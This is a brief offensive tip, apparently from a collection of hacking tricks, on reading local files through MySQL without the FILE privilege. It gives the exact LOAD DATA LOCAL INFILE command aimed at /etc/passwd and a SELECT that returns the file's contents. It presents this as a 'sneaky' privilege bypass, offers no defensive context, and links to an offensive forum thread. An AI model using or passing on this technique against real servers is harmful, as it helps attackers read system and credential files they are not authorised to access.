###Reading files without file_priv=Y on MySQL
####Sneaky!

It's possible to read files within a system through mysql without actually having file_priv. All you need to be able to do, is create a table and add data to it. This is where the MySQL `LOAD DATA` command comes in handy.

`LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE test FIELDS TERMINATED BY '';`

followed by

`SELECT * FROM test;`

will return the contents of /etc/passwd.

Further Reading:

[Bugscollector Trick #9](http://bugscollector.com/tricks/9/)
[Orginating Thread](https://rdot.org/forum/forumdisplay.php?s=8179277f689172cf2dc0d1adf10753a1&f=23)